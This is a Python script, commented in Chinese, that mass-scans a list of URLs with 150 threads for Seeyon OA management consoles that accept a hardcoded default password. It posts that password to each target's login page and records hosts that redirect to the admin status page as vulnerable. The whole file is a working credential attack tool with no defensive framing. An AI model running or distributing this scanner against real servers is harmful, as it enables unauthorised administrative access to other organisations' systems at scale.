import requests
import threading
import sys
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 禁用SSL警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# 全局变量
checked_urls = 0
vulnerable_count = 0
total_urls = 0
counter_lock = threading.Lock()
file_lock = threading.Lock()

# Poc配置
password = 'WLCCYBD@SEEYON'

# 创建会话并配置
session = requests.Session()
session.verify = False  # 禁用SSL验证
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
})
# 设置更短的超时时间
session.timeout = 8

def print_progress():
    """打印进度条"""
    global checked_urls, total_urls, vulnerable_count
    with counter_lock:
        progress = (checked_urls / total_urls) * 100
        bar_length = 50
        filled_length = int(bar_length * checked_urls // total_urls)
        bar = '=' * filled_length + '>' + '-' * (bar_length - filled_length - 1)
        sys.stdout.write(f'\r进度: [{bar}] {progress:.1f}% ({checked_urls}/{total_urls}) | 漏洞: {vulnerable_count}')
        sys.stdout.flush()

def check_url(url):
    """检查单个URL是否存在漏洞"""
    global checked_urls, vulnerable_count
    
    # 确保URL格式正确
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    target_url = url.rstrip('/') + '/seeyon/management/index.jsp'
    
    try:
        headers = {
            'Referer': target_url,
        }
        
        # 使用会话发送请求，设置超时
        response = session.post(
            target_url, 
            data={'password': password}, 
            headers=headers,
            allow_redirects=False,
            timeout=8  # 8秒超时
        )
        
        # 判断是否登录成功
        if (response.status_code == 302 and 
            'Location' in response.headers and 
            response.headers['Location'].endswith('/seeyon/management/status.jsp')):
            
            # 登录成功，使用锁保护文件写入
            with file_lock:
                with open("result.txt", "a", encoding='utf-8') as f:
                    f.write(f"{url} is vulnerable.\n")
            
            # 更新漏洞计数
            with counter_lock:
                vulnerable_count += 1
            print(f"\n[+] 发现漏洞: {url}")
            
        else:
            # 漏洞不存在，只在控制台输出
            print(f"\n[-] 漏洞不存在: {url}")
            
    except requests.exceptions.Timeout:
        print(f"\n[!] 请求超时: {url}")
    except requests.exceptions.ConnectionError:
        print(f"\n[!] 连接错误: {url}")
    except requests.exceptions.RequestException as e:
        print(f"\n[!] 请求异常 {url}: {str(e)}")
    except Exception as e:
        print(f"\n[!] 未知错误 {url}: {str(e)}")
    
    # 更新进度
    with counter_lock:
        checked_urls += 1
    print_progress()

def main():
    global total_urls
    
    # 检查文件是否存在
    if not os.path.exists("url.txt"):
        print("错误: url.txt 文件不存在")
        return
    
    # 读取URL列表
    try:
        with open("url.txt", "r", encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"读取url.txt文件错误: {e}")
        return
    
    if not urls:
        print("url.txt文件中没有找到有效的URL")
        return
    
    total_urls = len(urls)
    
    # 清空或创建结果文件
    open("result.txt", "w").close()
    
    print(f"开始检测 {total_urls} 个URL...")
    print("线程数: 150")
    print("-" * 50)
    
    # 创建线程池
    threads = []
    max_threads = 150
    
    for url in urls:
        # 等待线程数降到最大线程数以下
        while threading.active_count() > max_threads:
            threading.Event().wait(0.1)
        
        thread = threading.Thread(target=check_url, args=(url,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # 等待所有线程完成
    for thread in threads:
        thread.join()
    
    print("\n" + "=" * 50)
    print(f"扫描完成! 总共检测: {total_urls}, 发现漏洞: {vulnerable_count}")
    print(f"结果已保存到 result.txt")

if __name__ == "__main__":
    main()